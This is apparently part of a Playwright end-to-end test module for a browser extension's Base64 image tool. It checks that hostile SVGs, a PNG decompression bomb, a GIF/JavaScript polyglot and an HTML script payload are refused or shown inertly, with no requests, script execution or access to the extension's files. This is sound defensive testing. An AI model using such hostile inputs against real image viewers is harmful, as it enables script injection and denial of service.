  const before = { outside: outside.length, routed: routed.length, cdp: cdpRequests.length, popups: popups.length };
  const startUrl = page.url();
  for (const entry of corpus) {
    const cdpFrom = cdpRequests.length;
    const run = await timed(async () => {
      await put(b64(entry.svg));
      return settledPreview();
    }, 400);
    let clicked = null;
    if (entry.click && run.value === 'image') {
      await page.locator('[data-preview] img').click();
      await sleep(300);
      clicked = page.url() === startUrl;
    }
    const px = run.value === 'image' ? await pixel(5, 5) : null;
    const observed = run.value === 'image' && entry.observe ? await pixel(entry.observe.x, entry.observe.y) : null;
    const noteShown = (await notes()).some(n => n.startsWith('This SVG contains scripts or external references.'));
    const asUri = await (async () => {
      await put(`data:image/svg+xml;base64,${b64(entry.svg)}`);
      return settledPreview();
    })();
    const ownFiles = cdpRequests
      .slice(cdpFrom)
      .filter(r => r.url.startsWith(origin) && !/\/assets\//.test(r.url))
      .map(r => r.url);
    hostile.push({
      name: entry.name,
      preview: run.value,
      asDataUri: asUri,
      loadMs: run.ms,
      longestFrameMs: run.longest,
      pixel: px,
      ...(observed ? { observedPixel: observed } : {}),
      note: noteShown,
      clickStayed: clicked,
      extensionRequests: ownFiles,
    });
  }
  const canary = await canaryState();
  const violations = await page.evaluate(() => [...window.__b64Violations]);
  facts.hostile = hostile;
  const leaked = {
    outside: outside.slice(before.outside),
    routed: routed.slice(before.routed),
    popups: popups.slice(before.popups),
  };
  facts.hostileLeaks = leaked;
  const shownAll = hostile.every(
    (h, i) =>
      (h.preview === 'image' || (corpus[i].maybeDamaged && h.preview === 'damaged')) && h.asDataUri === h.preview,
  );
  const greenAll = hostile.every(
    (h, i) => !corpus[i].green || h.preview !== 'image' || JSON.stringify(h.pixel) === '[0,255,0,255]',
  );
  check(
    `${T}: hostile set (${corpus.length} SVGs, Base64 and data: URI) — each shown through <img> (or refused by Chrome's XML parser), nothing it names painted`,
    shownAll && greenAll,
    hostile.map(h => `${h.name.split(':')[0]}: ${h.preview}/${h.asDataUri} ${JSON.stringify(h.pixel)}`).join('; '),
  );
  check(
    `${T}: hostile set — no request left the browser (Playwright: ${leaked.outside.length}, routed .invalid: ${leaked.routed.length}), no request for the extension's own files, no script ran (canary), no navigation, no popup`,
    leaked.outside.length === 0 &&
      leaked.routed.length === 0 &&
      hostile.every(h => h.extensionRequests.length === 0) &&
      canary.window === null &&
      canary.local === null &&
      canary.storage === null &&
      page.url() === startUrl &&
      leaked.popups.length === 0 &&
      hostile.find(h => h.clickStayed !== null)?.clickStayed === true,
    `${JSON.stringify(leaked)}; canary ${JSON.stringify(canary)}; own-file requests ${JSON.stringify(hostile.flatMap(h => h.extensionRequests))}`,
  );
  check(
    `${T}: hostile set — the note of §2.5 on every entry with active content; no policy violation; the page stays responsive`,
    hostile.every(
      (h, i) =>
        ![
          'scripts',
          'event',
          '<foreignObject>',
          '<use>',
          'CSS',
          'the extension',
          'animation',
          'links',
          'stylesheet',
          'external',
        ].some(k => corpus[i].name.startsWith(k)) || h.note,
    ) &&
      violations.length === 0 &&
      hostile.every(h => h.longestFrameMs < 500),
    `violations ${JSON.stringify(violations)}; longest frames ${hostile.map(h => h.longestFrameMs).join(', ')} ms; load ${hostile.map(h => h.loadMs).join(', ')} ms`,
  );
  // What an SVG image can reach of the extension: its icon by chrome-extension: is painted exactly as an unreachable
  // address is (Chrome's broken-image glyph), by a path as nothing; the page itself loads the same icon (img-src 'self').
  {
    const one = href =>
      `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="10"><rect width="20" height="10" fill="#00ff00"/><image href="${href}" width="20" height="10"/></svg>`;
    const pixels = () =>
      page.evaluate(() => {
        const img = document.querySelector('[data-preview] img');
        const canvas = new OffscreenCanvas(img.naturalWidth, img.naturalHeight);
        const g = canvas.getContext('2d');
        g.drawImage(img, 0, 0);
        return Array.from(g.getImageData(0, 0, img.naturalWidth, img.naturalHeight).data).join(',');
      });
    const cdpFrom = cdpRequests.length;
    const drawn = {};
    for (const [name, href] of [
      ['extension', `chrome-extension://${id}/icons/icon-128.png`],
      ['unreachable', 'https://image.invalid/a.png'],
      ['path', '/icons/icon-128.png'],
    ]) {
      await put(b64(one(href)));
      await settledPreview();
      await sleep(200);
      drawn[name] = await pixels();
    }
    const allGreen = drawn.path.split(',').every((v, i) => v === ['0', '255', '0', '255'][i % 4]);
    const svgRequests = cdpRequests.slice(cdpFrom).filter(r => !r.url.startsWith('blob:'));
    const pageIcon = await page.evaluate(async src => {
      const img = new Image();
      img.src = src;
      return img.decode().then(
        () => `${img.naturalWidth}x${img.naturalHeight}`,
        () => 'error',
      );
    }, `chrome-extension://${id}/icons/icon-128.png`);
    facts.ownFiles = {
      sameAsUnreachable: drawn.extension === drawn.unreachable,
      pathPaintsNothing: allGreen,
      pageIcon,
    };
    check(
      `${T}: an SVG image cannot reach the extension's files — its icon by chrome-extension: paints the same broken-image glyph as an unreachable address, by path nothing; the page itself loads the icon`,
      drawn.extension === drawn.unreachable &&
        drawn.extension !== drawn.path &&
        allGreen &&
        pageIcon === '128x128' &&
        svgRequests.length === 0,
      `${JSON.stringify(facts.ownFiles)}; requests while the SVGs showed (besides their blob:) ${JSON.stringify(svgRequests.map(r => r.url))}`,
    );
  }
  await put(b64(corpus[0].svg));
  await settledPreview();
  await settledShot(shoot, page, 'tool-base64-image-04-svg-note.png');

  // ---- Decoders: claimed sizes, a decompression bomb, thousands of frames, a polyglot, a "PNG" that is not
  const decoders = {};
  {
    await put(zeroPng(50_000, 50_000, 2).toString('base64'));
    await page
      .locator('[data-preview="refused"]')
      .waitFor({ timeout: 5_000 })
      .catch(() => {});
    decoders.claimed = {
      state: await previewState(),
      img: await page.locator('[data-preview] img').count(),
      copyImage: await button('Copy image').isDisabled(),
      save: await button('Save image').isEnabled(),
    };
    const bomb = zeroPng(20_000, 20_000);
    await put(bomb.toString('base64'));
    await page
      .locator('[data-preview="refused"]')
      .waitFor({ timeout: 5_000 })
      .catch(() => {});
    decoders.bomb400 = { fileBytes: bomb.length, state: await previewState() };
    const big = zeroPng(8000, 8000);
    const shown64 = await timed(async () => {
      await put(big.toString('base64'));
      return settledPreview();
    }, 500);
    decoders.png64mp = { fileBytes: big.length, state: shown64.value, ms: shown64.ms, longest: shown64.longest };
    const gif = manyFrameGif(3000, 32, 32, 2);
    const anim = await timed(async () => {
      await put(gif.toString('base64'));
      return settledPreview();
    }, 2000);
    decoders.gif3000 = { fileBytes: gif.length, state: anim.value, ms: anim.ms, longest: anim.longest };
    // A GIF whose bytes are also JavaScript: shown as a GIF, never run.
    const gifJs = Buffer.concat([
      Buffer.from('GIF89a/*'),
      Buffer.from([1, 0, 1, 0, 0, 0, 0]),
      Buffer.from(`*/=1;${CANARY}//`),
      Buffer.from([0x3b]),
    ]);
    await put(gifJs.toString('base64'));
    decoders.polyglot = { state: await settledPreview(), type: await fact('Type').catch(() => null) };
    await put(Buffer.from('<!doctype html><script>top.__b64Pwned=1</script>').toString('base64'));
    await sleep(100);
    decoders.htmlAsPng = await errorLine();
  }
  facts.decoders = decoders;
  const afterCanary = await canaryState();
  check(
    `${T}: decoders — a header claiming 50,000 × 50,000 and a 400-megapixel PNG of zeros are not decoded (no <img>, Copy image off, Save on); 64 MP and a GIF of 3,000 frames show without a long frame; a GIF/JS polyglot is a GIF and never runs; HTML is refused`,
    decoders.claimed.state === 'refused' &&
      decoders.claimed.img === 0 &&
      decoders.claimed.copyImage &&
      decoders.claimed.save &&
      decoders.bomb400.state === 'refused' &&
      decoders.png64mp.state === 'image' &&
      decoders.png64mp.longest < 500 &&
      decoders.gif3000.state === 'image' &&
      decoders.gif3000.longest < 500 &&
      decoders.polyglot.type === 'GIF (image/gif)' &&
      afterCanary.window === null &&
      decoders.htmlAsPng === 'not an image this tool recognises (PNG, JPEG, GIF, WebP, AVIF, BMP, ICO, SVG)',
    JSON.stringify(decoders),
  );

  // ---- Object URLs: every one made has been revoked once its image went; then Clear, the other mode, leaving
  await put(`data:image/png;base64,${SAMPLE_PNG.toString('base64')}`);
  await settledPreview();
  const liveOne = await liveUrls();
  await button('Clear').click();
  await sleep(100);
  const afterClear = await liveUrls();
  await put(SAMPLE_PNG.toString('base64'));
  await settledPreview();
  const decodeUrl = (await liveUrls())[0];
  await radio('Encode').click();
  await sleep(100);
  // Encode shows its own image again (the one dropped before): a new URL, the Decode one revoked.
  const afterMode = await liveUrls();
  await hand('drop', [[SAMPLE_PNG, 'sample.png', 'image/png']]);
  await page.locator('[data-encoded]').waitFor();
  await settledPreview();
  await go(`${base}#/tools`);
  await sleep(200);
  const afterLeave = await liveUrls();
  const made = await page.evaluate(() => window.__b64Urls.all.length);
  check(
    `${T}: object URLs — one alive per shown image, revoked on Clear, on a change of direction and on leaving (${made} made in all)`,
    liveOne.length === 1 &&
      afterClear.length === 0 &&
      decodeUrl !== undefined &&
      !afterMode.includes(decodeUrl) &&
      afterMode.length <= 1 &&
      afterLeave.length === 0,
    JSON.stringify({ liveOne: liveOne.length, afterClear, decodeUrl, afterMode, afterLeave }),
  );
  await go(toolUrl);
  await page.locator('[data-slot="file-drop"]').waitFor();

  // ---- §12: a 10 MiB photo both ways
  const photo = Buffer.from(
    await blank.evaluate(async () => {
      let w = 4400;
      let h = 2900;
      for (;;) {
        const canvas = new OffscreenCanvas(w, h);
        const g = canvas.getContext('2d');
        const img = g.createImageData(w, h);
        for (let i = 0; i < img.data.length; i += 65536) crypto.getRandomValues(img.data.subarray(i, i + 65536));
        for (let i = 3; i < img.data.length; i += 4) img.data[i] = 255;
        g.putImageData(img, 0, 0);
        const blob = await canvas.convertToBlob({ type: 'image/jpeg', quality: 0.92 });
        if (blob.size <= 10 * 1024 * 1024) {
          const bytes = new Uint8Array(await blob.arrayBuffer());
          let s = '';
          for (let i = 0; i < bytes.length; i += 32768) s += String.fromCharCode(...bytes.subarray(i, i + 32768));
          return btoa(s);
        }
        w = Math.floor(w * 0.97);
        h = Math.floor(h * 0.97);
      }
    }),
    'base64',
  );
  // Long tasks, and when the file reached the tool (its input's change event, before the tool's own handler): the
  // handing over of the file by Playwright is one long task of its own before that moment, not the tool's.
  const watchTasks = () =>
    page.evaluate(() => {
      window.__b64Tasks = { tasks: [], from: null };
      window.__b64Observer = new PerformanceObserver(list => {
        for (const e of list.getEntries()) window.__b64Tasks.tasks.push([e.startTime, e.duration]);
      });
      window.__b64Observer.observe({ type: 'longtask' });
    });
  const tasksAfter = () =>
    page.evaluate(() => {
      const { tasks, from } = window.__b64Tasks;
      window.__b64Observer.disconnect();
      delete window.__b64Observer;
      delete window.__b64Tasks;
      return {
        before: Math.round(Math.max(0, ...tasks.filter(([s]) => s < from).map(([, d]) => d))),
        after: Math.round(Math.max(0, ...tasks.filter(([s]) => s >= from).map(([, d]) => d))),
      };
    });
  await watchTasks();
  await page.evaluate(() =>
    document
      .querySelector('input[type="file"]')
      .addEventListener('change', () => (window.__b64Tasks.from = performance.now()), { capture: true, once: true }),
  );
  const encodeRun = await timed(async () => {
    await fileInput.setInputFiles({ name: 'photo.jpg', mimeType: 'image/jpeg', buffer: photo });
    await page.locator('[data-part="truncated"]').filter({ hasText: 'Showing the first' }).waitFor({ timeout: 30_000 });
  }, 300);
  const encodeTasks = await tasksAfter();
  const bigOutLength = `data:image/jpeg;base64,`.length + Math.ceil(photo.length / 3) * 4;
  const shownLength = (await resultField.inputValue()).length;
  const truncNote = (await page.locator('[data-part="truncated"]').innerText()).trim();
  const tCopy = Date.now();
  await button('Copy').click();
  await button('Copied').waitFor({ timeout: 10_000 });
  const copyMs = Date.now() - tCopy;
  const copiedBig = await page.evaluate(() => document.documentElement.__e2eCopied.at(-1).length);
  const savedText = await download('Save');
  await radio('Decode').click();
  await watchTasks();
  // The paste in two steps: the field takes the text (its own cost), then the tool hears of it.
  const decodeRun = await timed(async () => {
    const field = await page.evaluate(
      async value => {
        const area = document.querySelector('#base64-image-input');
        const t0 = performance.now();
        Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value').set.call(area, value);
        // The field lays out and paints the text before the tool is told of it: that time is the field's.
        await new Promise(r => requestAnimationFrame(() => requestAnimationFrame(r)));
        const t1 = performance.now();
        window.__b64Tasks.from = t1;
        area.dispatchEvent(new Event('input', { bubbles: true }));
        return { set: Math.round(t1 - t0), handled: Math.round(performance.now() - t1) };
      },
      `data:image/jpeg;base64,${photo.toString('base64')}`,
    );
    await page.locator('[data-decoded]').waitFor({ timeout: 30_000 });
    return { field, state: await settledPreview(30_000) };
  }, 300);
  const decodeTasks = await tasksAfter();
  const decodedSize = await fact('Size');
  const workerUsed = workers.some(w => w.includes('codec.worker'));
  // The text field's own cost: the same 13.98 M characters into a bare <textarea> of a blank page, painted.
  const fieldOnly = await blank.evaluate(async length => {
    const area = document.createElement('textarea');
    document.body.append(area);
    const text = 'A'.repeat(length);
    const t0 = performance.now();
    area.value = text;
    await new Promise(r => requestAnimationFrame(() => requestAnimationFrame(r)));
    const ms = performance.now() - t0;
    area.remove();
    return Math.round(ms);
  }, bigOutLength);
  facts.large = {
    photoBytes: photo.length,
    encode: {
      ms: encodeRun.ms,
      longestFrameMs: encodeRun.longest,
      handingOverTaskMs: encodeTasks.before,
      toolLongestTaskMs: encodeTasks.after,
      shownLength,
      copyMs,
    },
    decode: {
      ms: decodeRun.ms,
      longestFrameMs: decodeRun.longest,
      fieldSetMs: decodeRun.value.field.set,
      inputHandledMs: decodeRun.value.field.handled,
      toolLongestTaskMs: decodeTasks.after,
      state: decodeRun.value.state,
    },
    textareaOnlyMs: fieldOnly,
    outputLength: bigOutLength,
    savedBytes: savedText.bytes.length,
    workerUsed,
  };
  check(
    `${T}: §12 a ${(photo.length / 1048576).toFixed(1)} MiB photo — encoded in the worker in ${encodeRun.ms} ms (the tool's longest task ${encodeTasks.after} ms), the field shows 65,536 characters, Copy (${copyMs} ms) and Save take all ${bigOutLength.toLocaleString('en-US')}; decoded back in ${decodeRun.ms} ms (the field took and painted the text in ${decodeRun.value.field.set} ms; the tool's longest task after it ${decodeTasks.after} ms); a bare field alone ${fieldOnly} ms`,
    shownLength === 65_536 &&
      truncNote ===
        `Showing the first 65,536 of ${bigOutLength.toLocaleString('en-US')} characters. Copy copies all.` &&
      copiedBig === bigOutLength &&
      savedText.name === 'photo.jpg.txt' &&
      savedText.bytes.length === bigOutLength &&
      decodeRun.value.state === 'image' &&
      encodeTasks.after < 300 &&
      decodeTasks.after < 300 &&
      decodedSize.startsWith(`${photo.length.toLocaleString('en-US')} bytes`) &&
      workerUsed,
    JSON.stringify(facts.large),
  );
  // A paste over 14 Mi characters never reaches the field.
  const overLimit = await page.evaluate(() => {
    const field = document.querySelector('#base64-image-input');
    const before = field.value.length;
    const data = new DataTransfer();
    data.setData('text/plain', 'A'.repeat(14 * 1024 * 1024 + 1));
    field.focus();
    field.select();
    const event = new ClipboardEvent('paste', { clipboardData: data, bubbles: true, cancelable: true });
    field.dispatchEvent(event);
    return { prevented: event.defaultPrevented, unchanged: field.value.length === before };
  });
  await sleep(100);
  check(
    `${T}: §6 a paste over 14 Mi characters is stopped before the field, with its message`,
    overLimit.prevented &&
      overLimit.unchanged &&
      (await errorLine()) === 'Input is larger than 14 MB of Base64 (about 10 MiB of image).',
    JSON.stringify(overLimit),
  );
  await button('Clear').click();

  // ---- History (D17): a small image is kept as a blob, opens back; the 10 MiB photo is not kept
  await radio('Encode').click();
  await hand('drop', [[logo, 'logo.png', 'image/png']]);
  const record = await waitForHistoryRecord(
    page,
    'base64-image',
    r => r.kind === 'encode' && r.payload?.bytes === logo.length,
  ).catch(() => null);
  const records = await historyRecords(page, 'base64-image');
  const historyPage = await ctx.newPage();
  await historyPage.goto(`${base}#/history`);
  await historyPage.locator('[data-page="history"]').waitFor();
  const entry = historyPage.locator('.kit-history-entry[data-kind="encode"]').first();
  await entry.waitFor();
  await entry.getByRole('button', { name: 'Open' }).click();
  await historyPage.locator('[data-restored]').waitFor();
  await historyPage.locator('[data-encoded]').waitFor();
  const reopened = {
    restored: await historyPage.locator('[data-restored]').innerText(),
    dims: await historyPage.locator('[data-fact="Dimensions"]').innerText(),
    file: await historyPage.locator('[data-fact="File"]').count(),
  };
  await historyPage.close();
  check(
    `${T}: history — the chosen image is kept as a blob without its name or Base64, opens back into Encode; nothing of the 10 MiB photo is kept`,
    record !== null &&
      (record.blobs ?? []).some(b => b.name === 'image' && b.size === logo.length) &&
      !JSON.stringify(record).includes('logo.png') &&
      !records.some(r => (r.payload?.bytes ?? 0) > 1024 * 1024) &&
      reopened.restored.startsWith('Opened from History: Encode · PNG · 64 × 64') &&
      reopened.dims === '64 × 64' &&
      reopened.file === 0,
    `${records.length} records; ${JSON.stringify(reopened)}`,
  );

  // ---- §7 on the start page: what opens for each kind of paste
  {
    const start = await ctx.newPage();
    const opens = {};
    for (const [kind, text] of [
      ['data URI', `data:image/png;base64,${SAMPLE_PNG.toString('base64')}`],
      ['PNG Base64', SAMPLE_PNG.toString('base64')],
      ['JPEG Base64', jpeg.toString('base64').slice(0, 400)],
      ['SVG Base64', b64('<svg xmlns="http://www.w3.org/2000/svg" width="2" height="2"/>')],
      ['percent SVG data URI', 'data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22/%3E'],
    ]) {
      await start.goto(`${base}#/start`);
      const field = start.getByRole('combobox', { name: 'Find a tool or search the web' });
      await field.waitFor();
      await field.focus();
      await start.evaluate(value => {
        const data = new DataTransfer();
        data.setData('text/plain', value);
        document.activeElement.dispatchEvent(
          new ClipboardEvent('paste', { clipboardData: data, bubbles: true, cancelable: true }),
        );
      }, text);
      await start.waitForFunction(() => location.hash.startsWith('#/tools/'), null, { timeout: 3_000 }).catch(() => {});
      opens[kind] = await start.evaluate(() => location.hash);
    }
    await start.close();
    facts.startPage = opens;
    check(
      `${T}: §7 on the start page — a data URI and Base64 of PNG / JPEG open this tool; Base64 of an SVG opens Base64 (№ 2, earlier in the registry: docs/defaults.md)`,
      opens['data URI'] === '#/tools/base64-image' &&
        opens['PNG Base64'] === '#/tools/base64-image' &&
        opens['JPEG Base64'] === '#/tools/base64-image' &&
        opens['SVG Base64'] === '#/tools/base64' &&
        opens['percent SVG data URI'] === '#/tools/base64-image',
      JSON.stringify(opens),
    );
  }

  // ---- Screenshots: light (above) and dark
  await go(toolUrl);
  await page.locator('[data-slot="file-drop"]').waitFor();
  await hand('drop', [[logo, 'logo.png', 'image/png']]);
  await page.locator('[data-encoded]').waitFor();
  await settledPreview();
  await inDarkTheme(ctx, base, page, async () => {
    await settledShot(shoot, page, 'tool-base64-image-05-encode-dark.png');
    await radio('Decode').click();
    await put(`data:image/png;base64,${jpeg.toString('base64')}`);
    await settledPreview();
    await settledShot(shoot, page, 'tool-base64-image-06-decode-dark.png');
  });

  // ---- Nothing left the browser in the whole module; put back what was replaced
  const finalViolations = await page.evaluate(() => {
    document.removeEventListener('securitypolicyviolation', window.__b64ViolationListener);
    const v = window.__b64Violations;
    delete window.__b64Violations;
    delete window.__b64ViolationListener;
    delete window.__b64Written;
    delete navigator.clipboard.write;
    if (window.__b64Urls) {
      URL.createObjectURL = window.__b64Urls.create;
      URL.revokeObjectURL = window.__b64Urls.revoke;
      delete window.__b64Urls;
    }
    return v ?? [];
  });
  await clipboard.restore();
  check(
    `${T}: the whole module — no request outside the extension (${outside.length}), none routed (${routed.length}), no policy violation on the tool's page`,
    outside.length === 0 && routed.length === 0 && finalViolations.length === 0,
    JSON.stringify({ outside: outside.slice(0, 5), routed: routed.slice(0, 5), finalViolations }),
  );
  facts.cdpRequestsOutside = cdpRequests.filter(
    r => !r.url.startsWith(origin) && !r.url.startsWith('blob:') && !r.url.startsWith('data:'),
  ).length;

  ctx.off('request', onRequest);
  ctx.off('page', onPopup);
  page.off('worker', onWorker);
  page.off('request', onPageLoad);
  cdp.off('Network.requestWillBeSent', onCdp);
  await cdp.detach().catch(() => {});
  await ctx.unroute(INVALID);
  await blank.close();
  await page.evaluate(url => location.replace(url), `${base}#/tools`);
};
